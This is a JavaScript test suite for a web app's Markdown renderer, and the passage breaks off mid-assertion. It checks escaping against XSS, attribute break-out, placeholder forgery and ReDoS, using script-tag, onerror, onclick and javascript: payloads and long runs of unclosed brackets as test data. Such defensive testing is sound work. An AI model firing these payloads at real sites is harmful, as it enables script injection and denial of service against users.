/**
 * test-next-markdown.js — OFFLINE suite for /next's Markdown renderer.
 *
 * WHY THIS FILE EXISTS
 * --------------------
 * /next's `renderMarkdown` shipped in v3.2.0 with NO test coverage of its own
 * (recorded as a known gap in the v3.7.0 release notes) while the SHIPPING
 * renderer next to it — src/public/markdown.js — has been pinned by
 * scripts/test-chat-markdown.js since v3.0.10. That asymmetry mattered the
 * moment the renderer was LIFTED into src/public/next/shared/markdown.js so
 * the wiki-browse reader could render rich Markdown instead of escaped
 * source: the lift WIDENS the renderer's input surface from "LLM chat
 * answers" to "wiki page bodies", and wiki bodies are LLM-authored AND
 * hand-editable AND arrive over Personal Sync and Shared Brain mirrors from
 * other machines and other people. That is hostile input by construction.
 *
 * This suite was written and made green BEFORE the lift, against the renderer
 * in its original home, and re-run unchanged after it — which is what proves
 * the move was behaviour-preserving rather than merely asserting it.
 *
 * THE CARDINAL RULE THE SUITE GUARDS
 * ----------------------------------
 * Escape the WHOLE string FIRST, then insert only a fixed allow-list of tags
 * by matching Markdown syntax in the ALREADY-ESCAPED text. No model text, no
 * user text, and no wiki-page text is ever interpolated into an attribute or
 * a URL, and the renderer emits no href/src sink at all.
 *
 * TECHNIQUE
 * ---------
 * The subject is an ES module that statically imports `icon` from ../app.js,
 * so it cannot simply be `import`ed here (that would pull the whole /next
 * shell, which needs a DOM). Instead the pure functions are extracted from
 * the real source by BRACE MATCHING and evaluated standalone with a stubbed
 * `icon` — the same technique scripts/test-next-mcp-wizard.js uses, including
 * its loud desync tripwire. A truncated or missing extraction THROWS; it must
 * never degrade into a green suite that silently tested nothing.
 */

import { readFileSync, existsSync, readdirSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(__dirname, '..');
const P_SHARED = path.join(ROOT, 'src/public/next/shared/markdown.js');
const P_CHAT = path.join(ROOT, 'src/public/next/views/chat.js');
const P_DOMAINS = path.join(ROOT, 'src/public/next/views/domains.js');
const P_DOMAINS_CSS = path.join(ROOT, 'src/public/next/views/domains.css');
const P_CHAT_CSS = path.join(ROOT, 'src/public/next/views/chat.css');

let passed = 0, failed = 0;
function ok(cond, label) {
  if (cond) { passed++; console.log(`  ✓ ${label}`); }
  else { failed++; console.log(`  ✗ ${label}`); }
}
function section(t) { console.log(`\n${t}`); }

// ── Comment stripping (for the source-level guards only) ─────────────────
// The subjects here are among the most heavily commented files in the repo,
// and several of those comments QUOTE the exact strings this suite asserts
// absent (`<pre class="dm-page-source">`, the old "must not import another
// view's internals" note). Run against raw text, those guards would be
// reading a comment instead of code — the "the check stopped reaching what
// it protects" failure this repo has recorded more than once.
//
// Deliberately conservative, exactly as in test-next-mcp-wizard.js: remove
// /* … */ blocks and lines whose first non-whitespace characters are //. It
// does NOT strip end-of-line comments — telling those from a // inside a
// string needs a real lexer, and the safe direction for an ABSENCE check is
// to leave too much in (a false FAILURE someone must look at), never too
// little (a false pass). assertStrippedSane() fails loudly on over-reach.
function stripComments(src) {
  return src
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .split('\n')
    .filter((line) => !/^\s*\/\//.test(line))
    .join('\n');
}
function assertStrippedSane(stripped, label, mustContain) {
  for (const needle of mustContain) {
    if (!stripped.includes(needle)) {
      throw new Error(`stripComments over-reached on ${label}: "${needle}" is gone from the stripped code`);
    }
  }
  return stripped;
}

// ── Brace-matched extraction ─────────────────────────────────────────────
// Same shape (and the same reasons) as test-next-mcp-wizard.js's copy: skip
// the parameter list before hunting for the body brace, then match braces,
// then a tripwire so a desynced matcher fails by NAME here rather than as a
// confusing SyntaxError out of new Function().
function extractFunction(src, name, label) {
  const marker = new RegExp(`(?:^|\\n)(?:export\\s+)?(?:async\\s+)?function ${name}\\s*\\(`);
  const m = marker.exec(src);
  if (!m) throw new Error(`extractFunction: "${name}" not found in ${label}`);
  const start = m.index + (m[0].startsWith('\n') ? 1 : 0);

  let p = src.indexOf('(', start);
  if (p === -1) throw new Error(`extractFunction: "${name}" has no parameter list in ${label}`);
  let parenDepth = 0;
  for (; p < src.length; p++) {
    if (src[p] === '(') parenDepth++;
    else if (src[p] === ')') { parenDepth--; if (parenDepth === 0) { p++; break; } }
  }
  let i = src.indexOf('{', p);
  if (i === -1) throw new Error(`extractFunction: "${name}" has no body in ${label}`);
  let depth = 0;
  for (; i < src.length; i++) {
    if (src[i] === '{') depth++;
    else if (src[i] === '}') { depth--; if (depth === 0) { i++; break; } }
  }
  // Drop a leading `export ` — the extraction has to be evaluable inside
  // new Function(), where an export declaration is a hard SyntaxError. The
  // marker above accepts it so this suite reads the same function whether it
  // is a module export (shared/markdown.js) or a file-local declaration.
  const extracted = src.slice(start, i).replace(/^export\s+/, '');
  if (!/\n\}$/.test(extracted)) {
    throw new Error(`extractFunction: "${name}" in ${label} does not end at a top-level closing brace — the matcher desynced`);
  }
  return extracted;
}

// ── Locate the ONE module that declares the renderer ──────────────────────
// This is a real guard, not plumbing. The whole point of lifting the renderer
// into next/shared/ is that there is exactly ONE copy: two hand-maintained
// copies of an escape-first guard is the shape that produced the v3.2.0
// CRITICAL, and this repo already pins duplicated frontend helpers with a
// byte-identity drift suite (test-next-ingest-logic-drift.js) because that
// duplication rots. If a second declaration ever reappears — a view
// "temporarily" inlining its own copy — this goes RED before the copies can
// drift apart.
//
// ── IT ENUMERATES THE TREE. IT USED NOT TO, AND THAT WAS THE BUG ──────────
// The first version of this guard tested a HARDCODED THREE-PATH LIST
// (shared/markdown.js, views/chat.js, views/domains.js). An adversarial audit
// appended a non-escape-first `export function renderMarkdown` to
// views/ingest.js and this suite stayed 129 passed / 0 failed, §0 still
// printing "exactly ONE … (found 1)". The comment right here claimed the
// opposite ("a view 'temporarily' inlining its own copy → RED"), and so did
// views/domains.js's import note ("§0 fails on a second declaration anywhere
// in /next"). Both were false.
//
// That is this repo's named failure shape twice over — a guard applied to an
// INSTANCE (three known files) rather than to the CLASS (every module in
// /next), wearing a docblock that overclaims the class. It mattered more than
// its size suggests: "there is exactly one copy" is the ENTIRE justification
// for lifting the renderer out of chat.js, so the guard protecting that
// rationale was blind to precisely the regression it exists to catch.
//
// Now it walks src/public/next/** mechanically — the same shape as the
// POST /api/domains call-site walk in test-next-chat-compile.js, and for the
// same reason: a hand-maintained inventory of "the files that could possibly
// contain this" is exactly what goes stale. Forms accepted: plain, exported,
// `export default`, and async function declarations, plus const/let/var
// function expressions and arrows — because a regression pasted back as
// `const renderMarkdown = (raw) => {…}` is the same defect and a
// `function`-only regex would wave it through. (`export default` is not
// hypothetical: it is this codebase's own idiom, used 13× in src/routes/.)
// A mutation proof at the end of this section confirms the detector fires on
// a fourth declarer.
//
// NOT ENFORCED — stated because the previous version of this guard claimed a
// reach it did not have, which is the whole reason it was rewritten. This is
// NAME-scoped, not algorithm-scoped. It does NOT catch: a copy under another
// name (`renderPageBody`), a class method, an object property, a `globalThis`
// assignment, or an aliased re-export (`export { renderMd as renderMarkdown }`).
// It walks `.js` only (no `.mjs` exist in the tree today). It therefore proves
// "exactly one thing NAMED renderMarkdown", NOT "exactly one copy of this
// algorithm" — the stronger claim the lift's rationale rests on.
const NEXT_DIR = path.join(ROOT, 'src/public/next');
function listNextJs(dir) {
  const out = [];
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const p = path.join(dir, entry.name);
    if (entry.isDirectory()) out.push(...listNextJs(p));
    else if (entry.name.endsWith('.js')) out.push(p);
  }
  return out;
}
// Comment-stripped: several files in /next DISCUSS `renderMarkdown` at length
// (this very concern is documented in shared/markdown.js's header and in
// domains.js's import note). Reading raw text would count a comment as a
// declaration — a false RED, which is the safe direction, but a noisy and
// misleading one. Note stripComments leaves END-OF-LINE comments in, so the
// residual error direction stays false-RED, never false-green.
//
// Deliberately NOT matched: `import { renderMarkdown } from …` and any call
// `renderMarkdown(` — those are the healthy shape this guard exists to allow.
const DECL_RE = /(?:^|\n)\s*(?:export\s+)?(?:default\s+)?(?:(?:async\s+)?function\s+renderMarkdown\s*\(|(?:const|let|var)\s+renderMarkdown\s*=)/;
function declaresRenderMarkdown(src) { return DECL_RE.test(stripComments(src)); }

const NEXT_JS_FILES = existsSync(NEXT_DIR) ? listNextJs(NEXT_DIR) : [];
const found = NEXT_JS_FILES
  .map((p) => ({ p, label: path.relative(ROOT, p), src: readFileSync(p, 'utf8') }))
  .filter((c) => declaresRenderMarkdown(c.src));

section('0. Single source of truth');
ok(NEXT_JS_FILES.length >= 8,
  `the walk actually reaches the /next tree (${NEXT_JS_FILES.length} .js files scanned, not a hardcoded list)`);
ok(found.length === 1,
  `exactly ONE /next module declares renderMarkdown (found ${found.length}: ${found.map((f) => f.label).join(', ') || 'none'})`);
if (found.length !== 1) {
  console.log(`\n${'─'.repeat(60)}`);
  console.log(`Passed: ${passed}   Failed: ${failed}`);
  console.log('❌ FAILURES — cannot load the renderer; aborting before the behaviour battery');
  process.exit(1);
}
const HOME = found[0];
console.log(`  · renderer home: ${HOME.label}`);

// ── Mutation proof: a fourth declarer in ANY /next module is detected ─────
// Without this, the assertion above is one hardcoded list away from being
// decorative again — which is exactly how it shipped the first time. The
// mutation is done on COPIES held in memory (this suite never writes to
// disk), reproducing the shape an audit actually used to defeat the old
// guard: a second `export function renderMarkdown` appended to a view that
// was not on the list. Every declaration FORM is exercised, because a
// detector that only knows `function` is the same instance-scoped mistake in
// miniature.
{
  const victim = NEXT_JS_FILES.find((p) => p !== HOME.p && /views[/\\]/.test(p));
  ok(!!victim, 'a non-home /next view exists to mutate (the detector has something to be tested against)');
  const clean = victim ? readFileSync(victim, 'utf8') : '';
  ok(victim ? !declaresRenderMarkdown(clean) : false,
    `control: the unmutated ${victim ? path.relative(ROOT, victim) : '?'} does NOT declare renderMarkdown`);

  const FORMS = {
    'plain function': '\nfunction renderMarkdown(raw) { return String(raw); }\n',
    'exported function': '\nexport function renderMarkdown(raw) { return String(raw); }\n',
    'async function': '\nasync function renderMarkdown(raw) { return String(raw); }\n',
    'const arrow': '\nconst renderMarkdown = (raw) => String(raw);\n',
    'exported const': '\nexport const renderMarkdown = function (raw) { return String(raw); };\n',
    'let function expression': '\nlet renderMarkdown = function (raw) { return String(raw); };\n',
  };
  for (const [form, snippet] of Object.entries(FORMS)) {
    ok(declaresRenderMarkdown(clean + snippet),
      `CONFIRMED RED (${form}): a second declarer appended to a copy of ${path.relative(ROOT, victim)} IS detected`);
  }
  // And the healthy shapes must NOT trip it, or the guard becomes a tax that
  // the next person disables rather than a signal.
  ok(!declaresRenderMarkdown(clean + "\nimport { renderMarkdown } from '../shared/markdown.js';\n"),
    'importing renderMarkdown is NOT counted as declaring it');
  ok(!declaresRenderMarkdown(clean + '\nconst html = renderMarkdown(page.body);\n'),
    'calling renderMarkdown is NOT counted as declaring it');
}

// ── 0b. THE HARDCODED FN LIST CANNOT SILENTLY GO STALE ───────────────────
// FNS below is hand-maintained, and v3.14.0 recorded exactly how that shape
// fails: a new helper the subject starts calling is NOT in the list, so the
// sandbox throws a ReferenceError at CALL time and the suite CRASHES with a
// stack trace instead of failing a named assertion. Loud, but useless — and
// on a bad day someone reads the crash as an environment problem.
//
// This closes it for this file. Enumerate every top-level `function NAME`
// the subject declares, then require that FNS names all of them. It is a
// SUPERSET check on purpose: extracting a function nothing calls costs a few
// bytes, whereas missing one is the crash above.
function declaredTopLevelFunctions(src) {
  const names = [];
  const re = /^(?:export\s+)?function\s+([A-Za-z_$][\w$]*)\s*\(/gm;
  let m;
  while ((m = re.exec(src))) names.push(m[1]);
  return names;
}

// ── Build the sandbox ─────────────────────────────────────────────────────
// `icon` is the only thing the renderer closes over from the shell. The stub
// is deliberately marked (`data-icon`) so an assertion can tell "the citation
// chip carries its dot icon" from "some other svg happened to be there".
const FNS = ['escHtml', 'unescHtml', 'formatSegment', 'citationMarkup', 'legacyCitationTag', 'renderInline',
  'splitTableRow', 'isTableDelimiterCell', 'tableAlignClass',
  // v3.72.0 block helpers (blockquote, rule, nesting).
  'indentWidth', 'isRule', 'isQuoteLine', 'stripQuoteMarker', 'isAttribution',
  'renderQuote', 'renderItemBody', 'renderList',
  'renderMarkdown'];
const bodySrc = FNS.map((n) => extractFunction(HOME.src, n, HOME.label)).join('\n\n');
const iconCalls = [];
const iconStub = (name, size) => {
  iconCalls.push([name, size]);
  return '<svg data-icon="' + name + '" width="' + (size || 19) + '"></svg>';
};
const sandbox = new Function('icon', `${bodySrc}\nreturn { ${FNS.join(', ')} };`)(iconStub);
section('0b. The extraction list covers every function the subject declares');
{
  const declared = declaredTopLevelFunctions(HOME.src);
  ok(declared.length >= 4, `sanity: the scan finds top-level functions at all (found ${declared.length})`);
  const missing = declared.filter((n) => !FNS.includes(n));
  ok(missing.length === 0,
    `every top-level function in ${HOME.label} is in FNS — a missing one crashes this suite instead of failing it` +
    (missing.length ? ` (missing: ${missing.join(', ')})` : ''));
  // Positive control: the scan must actually be able to SEE a new function.
  const probe = declaredTopLevelFunctions(HOME.src + '\nfunction zzProbeOnly() { return 1; }\n');
  ok(probe.includes('zzProbeOnly'), 'positive control — the scan detects a newly added top-level function');
}

const { renderMarkdown, escHtml } = sandbox;

// A helper for the recurring "did any LIVE markup form?" question. Live markup
// means: a real tag we did not put on the allow-list, or ANY event-handler /
// URL attribute at all.
const ALLOWED_TAGS = new Set(['p', 'br', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'div', 'span', 'svg',
  // Added with GFM table support — the renderer now legitimately emits
  // these. Widening the allow-list is safe for the same reason the whole
  // file is safe: every `<` in the INPUT was escaped before any pass ran,
  // so the only real tags in the output are ones this renderer wrote.
  'table', 'thead', 'tbody', 'tr', 'th', 'td']);
function foreignTags(html) {
  const out = [];
  const re = /<\/?([a-zA-Z][a-zA-Z0-9-]*)\b/g;
  let m;
  while ((m = re.exec(html))) if (!ALLOWED_TAGS.has(m[1].toLowerCase())) out.push(m[1]);
  return out;
}
// IMPORTANT — this deliberately inspects only REAL tags, and the reason is the
// whole point of the renderer. Because every `<` in the input was escaped to
// `&lt;` before any pass ran, the only unescaped `<` left in the output is one
// the renderer itself wrote. So `/<[^>]*>/` enumerates exactly the renderer's
// own markup, and an attribute is "live" only if it sits inside one of those.
// A naive scan of the WHOLE string is wrong and was caught red-handed while
// writing this suite: the escaped TEXT `&lt;img src=x onerror=alert(2)&gt;`
// contains the character run " src=" and " onerror=", so a whole-string regex
// reported an attribute break-out on output that is provably inert. That
// direction of error is the dangerous one to leave in — it trains the next
// reader to ignore this assertion.
function realTags(html) { return String(html).match(/<[^>]*>/g) || []; }
function hasLiveHandlerOrUrlAttr(html) {
  return realTags(html).some((t) =>
    /\son[a-z]+\s*=/i.test(t) || /\s(?:href|src|xlink:href|formaction|style)\s*=/i.test(t));
}

// ══ 1. XSS — the whole point ═════════════════════════════════════════════
section('1. XSS — raw HTML in the input never becomes live markup');
{
  const evil = 'Hi <script>alert(1)</script> and <img src=x onerror=alert(2)> and <svg/onload=alert(3)>';
  const h = renderMarkdown(evil);
  ok(!/<script/i.test(h), 'no live <script> tag');
  ok(!/<img/i.test(h), 'no live <img> tag');
  ok(!/<svg\/|<svg /i.test(h.replace(/<svg data-icon="[^"]*" width="\d+"><\/svg>/g, '')),
    'no live <svg> tag from input (only the renderer\'s own icon markup)');
  ok(/&lt;script&gt;/.test(h), 'the script text survives as escaped entities');
  ok(!hasLiveHandlerOrUrlAttr(h), 'no on*= / href= / src= / style= attribute anywhere in the output');
  ok(foreignTags(h).length === 0, `no tag outside the allow-list (saw: ${foreignTags(h).join(',') || 'none'})`);
}
{
  // Every one of the five escaped characters, individually and together.
  ok(escHtml('&') === '&amp;', 'escHtml: &');
  ok(escHtml('<') === '&lt;', 'escHtml: <');
  ok(escHtml('>') === '&gt;', 'escHtml: >');
  ok(escHtml('"') === '&quot;', 'escHtml: "');
  ok(escHtml("'") === '&#39;', "escHtml: '");
  ok(escHtml('&<>"\'') === '&amp;&lt;&gt;&quot;&#39;', 'escHtml: all five, ampersand first (no double-escape order bug)');
}
{
  // Markdown emphasis must not become a hole: the inner HTML stays escaped.
  const h = renderMarkdown('**<b>bold</b>** and *<i>it</i>*');
  ok(h.includes('<strong>') && h.includes('&lt;b&gt;'), 'bold applied, inner HTML still escaped');
  ok(!/<b>|<i>/.test(h), 'no live <b>/<i> from the input');
}

// ══ 2. Attribute break-out through EVERY interpolation point ═════════════
// The renderer has exactly four places where input text lands inside markup
// it emits: a wikilink target, a wikilink alias, a citation path, and an
// inline code span. Each is attacked here with the same battery.
section('2. Attribute break-out — every interpolation point');
{
  const vectors = [
    ['wikilink target', '[[a" onmouseover="alert(1)]]'],
    ['wikilink alias', '[[x|y" onmouseover="alert(1)]]'],
    ['citation path', '[source: b" onclick="alert(1)]'],
    ['inline code', '`c" onclick="alert(1)`'],
    ['heading', '# h" onclick="alert(1)'],
    ['list item', '- li" onclick="alert(1)'],
    ['fenced code', '```\nx" onclick="alert(1)\n```'],
    ['mixed', '[[a]] [source: b] `c` **d** <img src=x onerror=y>'],
  ];
  for (const [label, input] of vectors) {
    const h = renderMarkdown(input);
    ok(!hasLiveHandlerOrUrlAttr(h), `${label}: no live handler/URL attribute forms`);
    ok(foreignTags(h).length === 0, `${label}: no foreign tag`);
    ok(!realTags(h).some((t) => /\son[a-z]+=(?:"[^"]*"|'[^']*'|[^\s>]+)/i.test(t)),
      `${label}: no on*= in any quoting form, inside any emitted tag`);
    // The quotes the attack supplied must still be visible as escaped
    // entities — proof the payload was neutralised rather than stripped.
    if (input.includes('"')) ok(h.includes('&quot;'), `${label}: the injected quote survives as &quot;`);
  }
}
{
  // javascript: URLs have no sink to reach — assert that stays true.
  const h = renderMarkdown('[[javascript:alert(1)]] and [source: javascript:alert(1)] and `javascript:alert(1)`');
  ok(!/href|src/i.test(h), 'javascript: text reaches no href/src (the renderer emits none)');
  ok(h.includes('javascript:alert(1)'), 'the text is still shown to the reader, inert');
}
{
  // The renderer's OWN emitted markup is the only markup in the output, and
  // every attribute in it is a literal the renderer wrote. Enumerate them.
  const h = renderMarkdown('# H\n\n[[a|b]] [source: p.md] `c`\n\n- one\n\n1. two\n\n```\nfenced\n```');
  const attrs = realTags(h).flatMap((t) => [...t.matchAll(/\s([a-zA-Z:-]+)=/g)].map((m) => m[1]));
  const unexpected = attrs.filter((a) => !['class', 'data-icon', 'width'].includes(a));
  ok(unexpected.length === 0, `only literal class/icon attributes are emitted (saw extra: ${unexpected.join(',') || 'none'})`);
}

// ══ 3. Sentinel forgery (the v3.0.10 class) ═══════════════════════════════
// v3.0.10 shipped a forgeable ` CODEn ` text placeholder in the SHIPPING
// renderer: an answer containing the literal token got corrupted. The fix was
// a STRUCTURAL split on the code-span syntax instead of a text sentinel.
// /next inherited the structural form; assert it, and assert no other
// placeholder-shaped token can be forged either.
section('3. Sentinel forgery — no text placeholder to forge');
{
  // Case-SENSITIVE on purpose: the v3.0.10 sentinel was the uppercase token
  // ` CODE0 `. An /i scan here matches the perfectly legitimate `<code>` tag
  // the renderer emits and reports a defect that does not exist — caught while
  // writing this suite.
  ok(!/\bCODE\d|__CODE|PLACEHOLDER|SENTINEL/.test(bodySrc),
    'the renderer source carries no uppercase text-sentinel/placeholder token');
  ok(bodySrc.includes('.split(/(`[^`\\n]+`)/g)'),
    'inline code is isolated by a STRUCTURAL split on the code-span syntax, not a sentinel');
  const h1 = renderMarkdown('A literal CODE0 token and a ' + String.fromCharCode(0) + ' NUL.');
  ok(h1.includes('CODE0'), 'literal CODE0 stays literal');
  ok(!/undefined/.test(h1), 'no undefined leaks from a forged placeholder');
  const h2 = renderMarkdown('Here is `real` and also a fake CODE0 token.');
  ok(/<code>real<\/code>/.test(h2) && h2.includes('CODE0'), 'a real code span renders AND the literal stays literal');
  // Code-span contents must NOT be re-formatted (that is what the structural
  // split buys): markdown syntax inside backticks stays inert text.
  const h3 = renderMarkdown('`**not bold** and [[not a link]]`');
  ok(!/<strong>/.test(h3), 'markdown inside a code span is not re-formatted (bold)');
  ok(!/chat-wikilink/.test(h3), 'markdown inside a code span is not re-formatted (wikilink)');
}

// ══ 4. Pass ORDERING invariant (the M1/M3 regression guards) ═════════════
// The citation pass MUST run last in formatSegment. Both adversarial vectors
// recorded in the source's own comments are replayed here so a reorder fails
// behaviourally, not just as a diff someone has to notice.
section('4. Pass ordering — citation stays last');
{
  const m1 = renderMarkdown('[source: x[[y] tail]] rest of the document');
  ok(!hasLiveHandlerOrUrlAttr(m1), 'M1 vector: no live attribute');
  ok((m1.match(/<span/g) || []).length === (m1.match(/<\/span>/g) || []).length,
    'M1 vector: every emitted <span> is closed (no consumed closing tag)');
  ok(m1.includes('rest of the document'), 'M1 vector: no span of the document is deleted');

  const m3 = renderMarkdown('[source: [[a]] onerror=alert(1) ]');
  ok(!/data-cite=/.test(m3), 'M3 vector: the citation path is NOT placed in an attribute');
  ok(/chat-cite-path/.test(m3), 'M3 vector: the path lives in a dedicated text-content span');
  ok(!hasLiveHandlerOrUrlAttr(m3), 'M3 vector: no live attribute forms');
  ok((m3.match(/<span/g) || []).length === (m3.match(/<\/span>/g) || []).length, 'M3 vector: spans balanced');

  // ── The EMPHASIS side of the same class (audit finding, LOW) ────────────
  // The two vectors above are both CITATION-side. The identical hazard
  // exists on the emphasis passes, which run over markup the WIKILINK pass
  // already emitted: `[[a**b]]**` yields
  //   <span class="chat-wikilink">a<strong>b</span></strong>
  // — the `<strong>` opened inside the span and closed outside it, so the
  // span's closing tag is consumed into the wrong element.
  //
  // KNOWN AND BENIGN, RECORDED RATHER THAN "FIXED": verified against a real
  // HTML parser, the browser repairs this to correct nesting with text
  // "ab", no attribute is reachable (neither tag carries one beyond the
  // fixed class), and the escape-first rule means nothing here came from
  // unescaped input. Changing the pass order or the emphasis regexes to
  // avoid it would alter renderer output and needs its own evidence — the
  // move that created this module is proven safe precisely BY its output
  // being byte-identical. What was actually wrong is that §4 replayed only
  // the citation vectors, leaving this arm with no vector at all.
  //
  // SCOPE, honestly: these four assertions pin the CURRENT output shape
  // (balanced span counts, balanced emphasis counts, no foreign tag, no live
  // attribute). They do NOT detect a pass REORDER — a re-audit tried two
  // (citation-first, and emphasis-before-wikilink) and both produced output
  // BYTE-IDENTICAL to unmutated here, so the reorder scenario an earlier
  // draft of this comment claimed to cover is not in fact covered. What they
  // would catch is a change to the emphasis or wikilink REGEXES that
  // unbalances the tags. Left as-is rather than widened: the reorder case is
  // already pinned by §4's M1 citation vectors, which DO go red on it.
  for (const [vec, label] of [['[[a**b]]**', 'bold'], ['[[a_b]]_', 'underscore-emphasis']]) {
    const e = renderMarkdown(vec);
    ok((e.match(/<span/g) || []).length === (e.match(/<\/span>/g) || []).length,
      `emphasis vector (${label}): <span> open/close counts stay balanced`);
    ok(!hasLiveHandlerOrUrlAttr(e), `emphasis vector (${label}): no live attribute forms`);
    ok(foreignTags(e).length === 0, `emphasis vector (${label}): no tag outside the allow-list`);
    ok((e.match(/<strong>|<em>/g) || []).length === (e.match(/<\/strong>|<\/em>/g) || []).length,
      `emphasis vector (${label}): emphasis tags are themselves balanced (mis-NESTED, never mis-COUNTED)`);
  }
}

// ══ 4b. ReDoS — the two wiki-token passes are LENGTH-BOUNDED ═════════════
// Found by adversarial audit. `\[\[([^\]|]+)…\]\]` and `\[source:([^\]]+)\]`
// are QUADRATIC on unclosed brackets: every `[[` sends the greedy class to
// end-of-input hunting a `]]` that never arrives, then backtracks all the
// way. Measured on this module BEFORE the bound → AFTER it:
//     '[['.repeat(8000)   ( 16 KB)   1,367 ms  →   15 ms
//     '[['.repeat(32000)  ( 64 KB)  19,194 ms  →   63 ms   (307×)
//     '[source:'x32000    (256 KB)   3,399 ms  →   32 ms
//     '[source:'x128000   (  1 MB)  69,422 ms  →  127 ms   (547×)
//     benign prose         (  1 MB)       2 ms →    2 ms   (unchanged)
// Before: 4× input → 14–20× time (quadratic). After: 4× input → ~4× time.
//
// The algorithm is shared with the SHIPPING src/public/markdown.js and is not
// a finding there — that renderer only sees the user's own chat answers. It
// became one here when the lift widened this renderer's input to WIKI PAGE
// BODIES, which arrive over Personal Sync and Shared Brain mirrors from other
// people's machines. renderMarkdown runs synchronously into innerHTML, so a
// single hostile mirrored page froze the victim's tab for a minute or more.
//
// Numbered 4b rather than renumbered into the middle: §5–§9 are referenced by
// name in the module's own comments, and churning them to insert a section is
// how cross-references rot.
section('4b. ReDoS — the wiki-token passes carry a measured length bound');
{
  // ── Structural: no unbounded quantifier survives, and the bound is ONE
  // number in all three places. This is the deterministic half; the timing
  // assertions below are the behavioural backup.
  const src = HOME.src;
  const wikiRe = /t\.replace\(\/\\\[\\\[\(\[\^\\\]\|\]\{1,(\d+)\}\)\(\?:\\\|\(\[\^\\\]\]\{1,(\d+)\}\)\)\?\\\]\\\]\/g/.exec(src);
  const citeRe = /t\.replace\(\/\\\[source:\(\[\^\\\]\]\{1,(\d+)\}\)\\\]\/g/.exec(src);
  ok(!!wikiRe, 'the wikilink pass uses {1,N} on BOTH capture groups (target and alias), not +');
  ok(!!citeRe, 'the citation pass uses {1,N} on its capture group, not +');
  const bounds = [wikiRe && wikiRe[1], wikiRe && wikiRe[2], citeRe && citeRe[1]].map(Number);
  // `> 0`, not `Number.isFinite`: a non-matching regex above yields
  // Number(null) === 0, so an isFinite test made this assertion pass
  // VACUOUSLY on the very mutation it accompanies (caught by running that
  // mutation — [0,0,0] are all "equal"). The two ok(!!…) checks above still
  // went red, so nothing was missed, but a vacuous green next to a real red
  // is how a guard starts being ignored.
  ok(bounds.every((b) => b === bounds[0]) && bounds[0] > 0,
    `all three bounds are the SAME positive number (got ${JSON.stringify(bounds)}) — one value cannot drift against another`);
  // THE FLOOR IS MEASURED, NOT GUESSED. Real corpus: 5,221 wiki pages /
  // 36,910 wikilinks / 53 conversations. Longest real wikilink TARGET 241,
  // longest real ALIAS 40, longest real [source:] path 205 (an LLM emitted
  // two comma-joined summary paths inside one citation). The intuitive
  // "round" bound of 200 would have silently broken a real link in the
  // maintainer's own wiki AND a real citation in his own chat history. Do
  // not lower this without re-measuring the corpus.
  ok(bounds[0] >= 300,
    `the bound (${bounds[0]}) clears the longest token measured in the real corpus (241) with headroom`);
  ok(bounds[0] <= 4096, `the bound (${bounds[0]}) is small enough to keep the pass linear in page size`);

  // ── Behavioural regression guard for the floor. If someone later "tidies"
  // the bound down to a rounder number, THESE go red with a concrete symptom
  // rather than the change landing silently and breaking real pages.
  const longTarget = 'x'.repeat(241);
  const rLong = renderMarkdown('[[' + longTarget + ']]');
  ok(/class="chat-wikilink"/.test(rLong),
    'a 241-character wikilink target (the longest in the real wiki) still renders AS a wikilink');
  ok(rLong.includes(longTarget), 'and its full label survives — nothing is truncated');
  const rAlias = renderMarkdown('[[t|' + 'a'.repeat(40) + ']]');
  ok(/class="chat-wikilink"/.test(rAlias), 'a 40-character alias (the longest in the real wiki) still renders');
  const longPath = 'summaries/' + 'p'.repeat(195);
  const rCite = renderMarkdown('[source: ' + longPath + ']');
  ok(/class="chat-citation-tag"/.test(rCite),
    'a 205-character citation path (the longest in real conversations) still renders AS a chip');
  ok(rCite.includes(longPath), 'and its full path survives for the click handler to read back');

  // ── Degradation above the bound is SAFE: literal text, never half-markup.
  const over = renderMarkdown('[[' + 'x'.repeat(bounds[0] + 1) + ']]');
  ok(!/chat-wikilink/.test(over), 'a token longer than the bound does NOT render as a wikilink');
  ok((over.match(/<span/g) || []).length === (over.match(/<\/span>/g) || []).length,
    'and produces no unbalanced span — it degrades to literal text, not partial markup');
  ok(foreignTags(over).length === 0 && !hasLiveHandlerOrUrlAttr(over),
    'over-bound input emits no foreign tag and no live attribute');

  // ── Timing: ABSOLUTE CEILINGS ONLY, deliberately.
  //
  // An earlier version of this block also asserted the SCALING RATIO
  // (tLarge/tSmall < 8) on the theory that a ratio is machine-independent
  // because a slow box shifts both samples together. THAT THEORY IS WRONG
  // AND WAS MEASURED WRONG: each sample is a single wall-clock reading, so
  // under CPU contention either one can be descheduled independently. On
  // provably LINEAR code the observed ratio ranged 0.3 to 35.9 — a ~120×
  // spread, with values below 1 meaning the small input measured SLOWER than
  // the large one. Failure rate: 0% idle, 0% at 2x core oversubscription,
  // 73% at ~5x. GitHub's 2-core shared runners sit in that band.
  //
  // It was removed rather than loosened, because a metric spanning 0.3–35.9
  // has no threshold that both never flakes and still detects a regression.
  // The clincher was its FAILURE TEXT: it read "4x input -> 25.2x time
  // (quadratic measured 14-20x)", i.e. it told a CI reader the ReDoS fix had
  // REGRESSED when it had not. A guard that cries wolf about a main-thread
  // freeze is worse than no guard — it teaches people to ignore the one
  // assertion protecting it.
  //
  // The ceilings below are what actually carry the guarantee, and they are
  // robust: at load average 82 the worst observed was 337 ms against 1500.
  // Reverting the three quantifiers to `+` still fails tLarge in ~1.9 s.
  // Detection is preserved; the false-alarm surface is not.
  const timeMs = (s) => { const t0 = process.hrtime.bigint(); renderMarkdown(s); return Number(process.hrtime.bigint() - t0) / 1e6; };
  const tLarge = timeMs('[['.repeat(16000));   // 32 KB
  ok(tLarge < 1500, `32 KB of unclosed wikilinks renders in ${tLarge.toFixed(0)} ms (unbounded: ~469 ms at this size, quadratic beyond)`);

  const cLarge = timeMs('[source:'.repeat(32000));  // 256 KB
  ok(cLarge < 1500, `256 KB of unclosed citations renders in ${cLarge.toFixed(0)} ms (unbounded: ~4,222 ms)`);

  // The real corpus's LARGEST page is 314,971 bytes. A page that size made
  // entirely of the pathological shape must still be interactive, or the
  // bound would just have moved the freeze rather than removed it.
  const tRealMax = timeMs('[['.repeat(157500)); // 315 KB, all unclosed
  ok(tRealMax < 6000,   // 6000 not 3000: reached 2107 ms (70% of a 3000 cap) at load avg 82
